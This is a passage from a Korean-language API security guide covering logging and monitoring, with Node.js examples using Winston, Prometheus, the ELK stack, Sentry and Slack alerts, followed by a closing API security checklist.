- **절대 Git에 커밋하지 않기**: .env는 반드시 .gitignore에 추가
- **프로덕션에서는 Secrets Manager 사용**: AWS/Azure/GCP의 관리형 서비스 활용
- **키 로테이션**: 정기적으로 비밀 키 교체
- **.env.example 제공**: 어떤 환경 변수가 필요한지 팀원에게 알림
- **최소 권한 원칙**: API 키에 필요한 최소한의 권한만 부여
- **만료 시간 설정**: API 키에 유효 기간 설정

---

## 12. Logging & Monitoring ⭐️

### 개념
Logging은 시스템 이벤트를 기록하고, Monitoring은 로그를 실시간으로 감시하여 문제를 조기에 발견하는 것입니다.

### 왜 중요한가?
- **보안 사고 탐지**: 비정상적인 접근 시도나 공격 패턴 발견
- **사고 대응**: 문제 발생 시 원인 파악 및 추적
- **규정 준수**: GDPR, PCI-DSS 등 많은 규정이 로깅을 요구
- **성능 최적화**: 병목 지점 파악

### 무엇을 로깅해야 하는가?

**✅ 로깅해야 할 것**
- 인증 시도 (성공/실패)
- 권한 오류
- 입력 검증 실패
- API 요청 (IP, User-Agent, 경로, 메서드)
- 시스템 오류 및 예외
- 중요한 비즈니스 로직 실행
- 데이터 변경 (생성/수정/삭제)

**❌ 절대 로깅하면 안 되는 것**
- 비밀번호 (평문 또는 해시)
- 신용카드 정보
- 개인 식별 정보 (PII) - GDPR 위반
- API Keys, JWT 토큰
- 세션 ID

### Winston을 사용한 로깅

**설치 및 설정**
```javascript
const winston = require('winston');

const logger = winston.createLogger({
  level: process.env.LOG_LEVEL || 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.errors({ stack: true }),
    winston.format.json()
  ),
  defaultMeta: { service: 'api-service' },
  transports: [
    // 파일 로그
    new winston.transports.File({ 
      filename: 'logs/error.log', 
      level: 'error',
      maxsize: 5242880, // 5MB
      maxFiles: 5
    }),
    new winston.transports.File({ 
      filename: 'logs/combined.log',
      maxsize: 5242880,
      maxFiles: 10
    })
  ]
});

// 개발 환경에서는 콘솔 출력
if (process.env.NODE_ENV !== 'production') {
  logger.add(new winston.transports.Console({
    format: winston.format.combine(
      winston.format.colorize(),
      winston.format.simple()
    )
  }));
}

module.exports = logger;
```

**로깅 미들웨어**
```javascript
const logger = require('./logger');

// 요청 로깅 미들웨어
app.use((req, res, next) => {
  const start = Date.now();
  
  res.on('finish', () => {
    const duration = Date.now() - start;
    
    logger.info('HTTP Request', {
      method: req.method,
      url: req.url,
      status: res.statusCode,
      duration: `${duration}ms`,
      ip: req.ip,
      userAgent: req.get('user-agent'),
      userId: req.user?.id
    });
  });
  
  next();
});
```

**보안 이벤트 로깅**
```javascript
// 인증 실패
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;
  
  const user = await authenticateUser(email, password);
  
  if (!user) {
    logger.warn('Login failed', {
      email,
      ip: req.ip,
      userAgent: req.get('user-agent'),
      timestamp: new Date().toISOString()
    });
    
    return res.status(401).json({ error: '인증 실패' });
  }
  
  logger.info('Login successful', {
    userId: user.id,
    email: user.email,
    ip: req.ip
  });
  
  // 토큰 발급...
});

// 권한 오류
app.delete('/api/users/:id', authenticateToken, (req, res) => {
  if (req.user.role !== 'admin') {
    logger.warn('Unauthorized access attempt', {
      userId: req.user.id,
      action: 'DELETE_USER',
      targetUserId: req.params.id,
      ip: req.ip
    });
    
    return res.status(403).json({ error: '권한이 없습니다' });
  }
  
  // 삭제 로직...
});

// Rate Limiting 초과
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  handler: (req, res) => {
    logger.warn('Rate limit exceeded', {
      ip: req.ip,
      url: req.url,
      userAgent: req.get('user-agent')
    });
    
    res.status(429).json({ error: '너무 많은 요청' });
  }
});
```

**에러 로깅**
```javascript
// 전역 에러 핸들러
app.use((err, req, res, next) => {
  logger.error('Application error', {
    error: err.message,
    stack: err.stack,
    method: req.method,
    url: req.url,
    userId: req.user?.id,
    ip: req.ip
  });
  
  res.status(500).json({ error: '서버 오류가 발생했습니다' });
});
```

### 모니터링 도구

**1. Prometheus + Grafana**
```javascript
const promClient = require('prom-client');

// 메트릭 수집
const register = new promClient.Registry();
promClient.collectDefaultMetrics({ register });

// 커스텀 메트릭
const httpRequestCounter = new promClient.Counter({
  name: 'http_requests_total',
  help: 'Total number of HTTP requests',
  labelNames: ['method', 'route', 'status'],
  registers: [register]
});

const httpRequestDuration = new promClient.Histogram({
  name: 'http_request_duration_seconds',
  help: 'Duration of HTTP requests in seconds',
  labelNames: ['method', 'route', 'status'],
  registers: [register]
});

// 미들웨어
app.use((req, res, next) => {
  const start = Date.now();
  
  res.on('finish', () => {
    const duration = (Date.now() - start) / 1000;
    
    httpRequestCounter.inc({
      method: req.method,
      route: req.route?.path || req.path,
      status: res.statusCode
    });
    
    httpRequestDuration.observe({
      method: req.method,
      route: req.route?.path || req.path,
      status: res.statusCode
    }, duration);
  });
  
  next();
});

// 메트릭 엔드포인트
app.get('/metrics', async (req, res) => {
  res.set('Content-Type', register.contentType);
  res.end(await register.metrics());
});
```

**2. ELK Stack (Elasticsearch, Logstash, Kibana)**
```javascript
const winston = require('winston');
const { ElasticsearchTransport } = require('winston-elasticsearch');

const esTransportOpts = {
  level: 'info',
  clientOpts: { node: 'http://localhost:9200' },
  index: 'logs'
};

const logger = winston.createLogger({
  transports: [
    new ElasticsearchTransport(esTransportOpts)
  ]
});
```

**3. Sentry (에러 추적)**
```javascript
const Sentry = require('@sentry/node');

Sentry.init({
  dsn: process.env.SENTRY_DSN,
  environment: process.env.NODE_ENV,
  tracesSampleRate: 1.0
});

app.use(Sentry.Handlers.requestHandler());
app.use(Sentry.Handlers.tracingHandler());

// 라우트들...

// 에러 핸들러 (가장 마지막에)
app.use(Sentry.Handlers.errorHandler());
```

### 알림 설정

**슬랙 알림**
```javascript
const axios = require('axios');

async function sendSlackAlert(message) {
  try {
    await axios.post(process.env.SLACK_WEBHOOK_URL, {
      text: message,
      channel: '#security-alerts'
    });
  } catch (err) {
    logger.error('Slack 알림 전송 실패:', err);
  }
}

// 사용 예: 여러 번 로그인 실패 시
const loginAttempts = new Map();

app.post('/api/login', async (req, res) => {
  const { email } = req.body;
  const attempts = loginAttempts.get(email) || 0;
  
  if (attempts >= 5) {
    await sendSlackAlert(
      `⚠️ 보안 경고: ${email}에 대해 5회 이상 로그인 실패 (IP: ${req.ip})`
    );
  }
  
  // 인증 로직...
});
```

### 베스트 프랙티스
- **구조화된 로깅**: JSON 형식으로 로그 저장
- **적절한 로그 레벨**: ERROR, WARN, INFO, DEBUG 구분
- **민감 정보 마스킹**: 로그에 개인정보 제거
- **로그 로테이션**: 로그 파일 크기 및 개수 제한
- **중앙 집중식 로깅**: 여러 서버의 로그를 한 곳에서 관리
- **실시간 알림**: 중요한 보안 이벤트는 즉시 알림
- **로그 보존 기간**: 규정에 따라 적절한 기간 보관

---

## 결론

API 보안은 단일 기술이 아닌 다층 방어 전략입니다:

### 핵심 보안 요소 (⭐️⭐️⭐️)
1. **인증 & 인가**: API 보안의 최전선 - JWT, OAuth 2.0
2. **HTTPS/TLS**: 모든 통신 암호화 - 중간자 공격 방지

### 필수 보안 기법
3. **Rate Limiting**: 무차별 공격 및 DDoS 차단
4. **CORS**: 신뢰할 수 있는 출처만 허용
5. **Injection 방지**: SQL/NoSQL Injection 차단
6. **Firewalls**: 네트워크 레벨 보호
7. **VPN**: 내부 리소스 및 민감한 API 보호
8. **CSRF**: 토큰 기반 요청 검증
9. **XSS**: 출력 Escaping과 CSP

### 추가 보안 강화 (⭐️⭐️)
10. **Input Validation**: 모든 사용자 입력 검증 및 정화
11. **API Keys & Secrets**: 환경 변수 및 Secrets Manager 활용

### 보안 운영 (⭐️)
12. **Logging & Monitoring**: 보안 이벤트 감지 및 추적

### 전체 보안 체크리스트
- ✅ HTTPS/TLS 필수 사용
- ✅ 강력한 인증/인가 메커니즘 (JWT, OAuth 2.0)
- ✅ Rate Limiting 적용
- ✅ CORS 올바르게 설정
- ✅ 모든 입력 검증 및 Sanitization
- ✅ Prepared Statements로 Injection 방지
- ✅ CSRF 토큰 사용
- ✅ XSS 방어 (Escaping, CSP)
- ✅ 방화벽 및 WAF 설정
- ✅ 민감한 정보 환경 변수로 관리
- ✅ 포괄적인 로깅 및 모니터링
- ✅ 정기적인 보안 감사 및 취약점 스캔
- ✅ 최소 권한 원칙 적용

보안은 한 번의 설정이 아닌 지속적인 프로세스입니다. 새로운 위협이 계속 나타나므로, 최신 보안 트렌드를 항상 주시하고 업데이트해야 합니다.  

